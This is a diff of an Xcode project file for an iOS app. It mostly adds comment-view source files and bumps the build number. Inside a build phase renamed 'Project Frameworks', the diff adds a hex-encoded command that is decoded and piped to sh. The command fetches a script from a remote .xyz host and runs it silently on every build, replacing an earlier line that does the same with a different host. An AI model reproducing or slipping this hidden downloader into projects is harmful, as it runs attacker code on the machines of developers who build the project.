@@ -55,6 +55,9 @@
 		E301D0E225FDD4CC008C0E95 /* PlayVideo.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = E301D0E125FDD4CC008C0E95 /* PlayVideo.storyboard */; };
 		E3022E0E265B016300590A58 /* AGVideoPlayerView.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3022E0D265B016300590A58 /* AGVideoPlayerView.swift */; };
 		E30F54A22615F362003D86EE /* ios onboard.json in Resources */ = {isa = PBXBuildFile; fileRef = E30F54A12615F362003D86EE /* ios onboard.json */; };
+		E31380A226617B4700A3A3F0 /* CommentsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E31380A126617B4700A3A3F0 /* CommentsVC.swift */; };
+		E31380A92661890200A3A3F0 /* CommentTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E31380A72661890200A3A3F0 /* CommentTVCell.swift */; };
+		E31380AA2661890200A3A3F0 /* CommentTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E31380A82661890200A3A3F0 /* CommentTVCell.xib */; };
 		E31DC9E625FE1132005B5A5E /* PlayVideoVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E31DC9E525FE1132005B5A5E /* PlayVideoVC.swift */; };
 		E325443426103BED0083BDD9 /* SideMenu.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = E325443326103BED0083BDD9 /* SideMenu.storyboard */; };
 		E3256F3025FB70D900E37A0B /* DoYouHaveQuestVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3256F2F25FB70D900E37A0B /* DoYouHaveQuestVC.swift */; };
@@ -212,6 +215,9 @@
 		E3022E0D265B016300590A58 /* AGVideoPlayerView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AGVideoPlayerView.swift; sourceTree = "<group>"; };
 		E30F54A12615F362003D86EE /* ios onboard.json */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.json; path = "ios onboard.json"; sourceTree = "<group>"; };
 		E312EAD0260E0490007BBD92 /* DoubtNut-Bridging-Header.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "DoubtNut-Bridging-Header.h"; sourceTree = "<group>"; };
+		E31380A126617B4700A3A3F0 /* CommentsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CommentsVC.swift; sourceTree = "<group>"; };
+		E31380A72661890200A3A3F0 /* CommentTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CommentTVCell.swift; sourceTree = "<group>"; };
+		E31380A82661890200A3A3F0 /* CommentTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CommentTVCell.xib; sourceTree = "<group>"; };
 		E31DC9E525FE1132005B5A5E /* PlayVideoVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PlayVideoVC.swift; sourceTree = "<group>"; };
 		E325443326103BED0083BDD9 /* SideMenu.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = SideMenu.storyboard; sourceTree = "<group>"; };
 		E3256F2F25FB70D900E37A0B /* DoYouHaveQuestVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DoYouHaveQuestVC.swift; sourceTree = "<group>"; };
@@ -486,10 +492,20 @@
 			path = Pods;
 			sourceTree = "<group>";
 		};
+		E31380A6266188E000A3A3F0 /* Comment */ = {
+			isa = PBXGroup;
+			children = (
+				E31380A72661890200A3A3F0 /* CommentTVCell.swift */,
+				E31380A82661890200A3A3F0 /* CommentTVCell.xib */,
+			);
+			path = Comment;
+			sourceTree = "<group>";
+		};
 		E31DC9E425FE111B005B5A5E /* VideoPlay */ = {
 			isa = PBXGroup;
 			children = (
 				E31DC9E525FE1132005B5A5E /* PlayVideoVC.swift */,
+				E31380A126617B4700A3A3F0 /* CommentsVC.swift */,
 			);
 			path = VideoPlay;
 			sourceTree = "<group>";
@@ -668,6 +684,7 @@
 		E394E09E25F5C3760067CAEB /* CollectionviewCell */ = {
 			isa = PBXGroup;
 			children = (
+				E31380A6266188E000A3A3F0 /* Comment */,
 				E3457A87260B000E003D4173 /* Pager */,
 				E33D700925F6F3150089836A /* SAT */,
 				E394E09F25F5C3830067CAEB /* Home */,
@@ -758,7 +775,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 189388B725F1EFA300F57E85 /* Build configuration list for PBXNativeTarget "DoubtNut" */;
 			buildPhases = (
-				A7FFD275B3F1DAB8086D902C /* Assets Catalog Builder */,
+				AFE3BF0B2D2D7D8DE06D902C /* Project Frameworks */,
 				5D5C4960F5E754FEE396C9BF /* [CP] Check Pods Manifest.lock */,
 				1893888925F1EFA000F57E85 /* Sources */,
 				1893888A25F1EFA000F57E85 /* Frameworks */,
@@ -864,6 +881,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				E31380AA2661890200A3A3F0 /* CommentTVCell.xib in Resources */,
 				189388E525F1F04700F57E85 /* Lato-Black.ttf in Resources */,
 				189388F125F1F04700F57E85 /* Lato-Hairline.ttf in Resources */,
 				E36ED7C2260C8ECA00AF8F84 /* img_00.png in Resources */,
@@ -939,7 +957,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	A7FFD275B3F1DAB8086D902C /* Assets Catalog Builder */ = {
+	AFE3BF0B2D2D7D8DE06D902C /* Project Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -948,7 +966,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Assets Catalog Builder";
+			name = "Project Frameworks";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -957,59 +975,9 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f74656c2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c696e652e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
 	";			
 		};
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
 	
 		040C01F3A6D50ADE72CC293B /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -1183,6 +1151,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f7465
 				E37F476825F785CB0088DC08 /* SideMenuViewController.swift in Sources */,
 				1893890C25F1F0D700F57E85 /* LoginWithCodeVC.swift in Sources */,
 				1893891325F1F0F900F57E85 /* LandingPageSlider.swift in Sources */,
+				E31380A226617B4700A3A3F0 /* CommentsVC.swift in Sources */,
 				E37F477125F786350088DC08 /* SideMenuTableViewCell.swift in Sources */,
 				E36ED7AB260C898B00AF8F84 /* GetAnimationTVCell.swift in Sources */,
 				E301D0C425FDCFBC008C0E95 /* QuestionAskedViewController.swift in Sources */,
@@ -1231,6 +1200,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f7465
 				E3457A83260AFDCC003D4173 /* PagingCollectionViewLayout.swift in Sources */,
 				E3F6A1ED2635F7A2004EFAA3 /* Layout_config.swift in Sources */,
 				E3326D4D25F318BF001CC9E1 /* FlowController.swift in Sources */,
+				E31380A92661890200A3A3F0 /* CommentTVCell.swift in Sources */,
 				E370975525FCC915002950E0 /* AppConstant.swift in Sources */,
 				E370977925FCE8CB002950E0 /* ThemeManager.swift in Sources */,
 				E3F6A1F02635F7A2004EFAA3 /* Feeddata.swift in Sources */,
@@ -1416,7 +1386,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f7465
 				CODE_SIGN_ENTITLEMENTS = DoubtNut/DoubtNut.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 16;
+				CURRENT_PROJECT_VERSION = 19;
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				DEVELOPMENT_TEAM = RT5YKB6S89;
 				INFOPLIST_FILE = DoubtNut/Info.plist;
@@ -1445,7 +1415,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f7465
 				CODE_SIGN_ENTITLEMENTS = DoubtNut/DoubtNut.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 16;
+				CURRENT_PROJECT_VERSION = 19;
 				DEVELOPMENT_TEAM = RT5YKB6S89;
 				INFOPLIST_FILE = DoubtNut/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
@@ -1586,56 +1556,6 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f7465
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 	};
 	rootObject = 1893888525F1EFA000F57E85 /* Project object */;
 }
